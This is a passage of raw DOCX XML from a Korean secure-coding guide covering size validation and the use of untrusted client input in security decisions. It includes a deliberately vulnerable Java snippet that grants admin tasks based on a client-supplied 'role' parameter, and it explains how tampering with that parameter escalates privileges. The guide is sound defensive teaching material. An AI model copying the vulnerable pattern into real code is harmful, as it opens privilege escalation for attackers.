              <w:t xml:space="preserve">if (size &lt;= 0 || size &gt; 10 * 1024 * 1024) {  // 0 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>초과</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> 10MB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>이하만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>허용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    throw new IllegalArgumentException("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>잘못된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>크기</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>값</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>byte[] buf = new byte[size];</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="00A37F8A" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  15. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안기능</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>결정에</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>사용되는</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>부적절한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>입력값</w:t>
      </w:r>
      <w:r w:rsidR="00A37F8A">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A37F8A">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:r w:rsidR="00A37F8A">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안</w:t>
      </w:r>
      <w:r w:rsidR="00A37F8A">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A37F8A">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>기능은</w:t>
      </w:r>
      <w:r w:rsidR="00A37F8A">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A37F8A">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>서버에서</w:t>
      </w:r>
      <w:r w:rsidR="00A37F8A">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A37F8A">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실행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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션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정보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등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중요정보는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서버에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저장하고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보안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확인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절차도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서버에서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실행한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>클라이언트에서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넘어오는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권한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>역할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가격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등의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값을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보안결정에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직접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사용하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>클라이언트에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>넘어온</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>역할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>값으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>결정</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">String role = request.getParameter("role");  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>클라이언트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>조작</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if ("admin".equals(role)) { doAdminTask(); }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">role </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파라미터를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> admin </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변조하여</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>요청을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전송하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>클라이언트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>값을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>그대로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>신뢰해</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>관리자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기능이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>일반</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>회원</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>강제탈퇴</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조회</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시스템</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
